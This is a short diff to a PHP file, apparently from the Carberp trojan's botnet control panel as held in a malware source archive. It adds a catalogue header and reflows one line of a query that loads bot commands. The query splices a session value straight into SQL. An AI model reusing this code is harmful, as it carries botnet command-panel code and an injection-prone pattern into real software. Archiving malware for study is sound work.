@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       —
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     —
+ */
 <?php
 
 $smarty->allow_php_tag = true;
@@ -81,7 +92,8 @@ if($config['scramb'] == 1){
 
 if(empty($_SESSION['user']->config['prefix'])){
 	$mysqli->query('SELECT * FROM bf_cmds WHERE (dev = \'0\')', null, 'cmd_init', false);
-}else{	$mysqli->query('SELECT * FROM bf_cmds WHERE (dev = \'0\') AND (prefix LIKE \''.$_SESSION['user']->config['prefix'].'|\')', null, 'cmd_init', false);
+}else{
+	$mysqli->query('SELECT * FROM bf_cmds WHERE (dev = \'0\') AND (prefix LIKE \''.$_SESSION['user']->config['prefix'].'|\')', null, 'cmd_init', false);
 }
 
 $smarty->assign('cmds', $cmds);
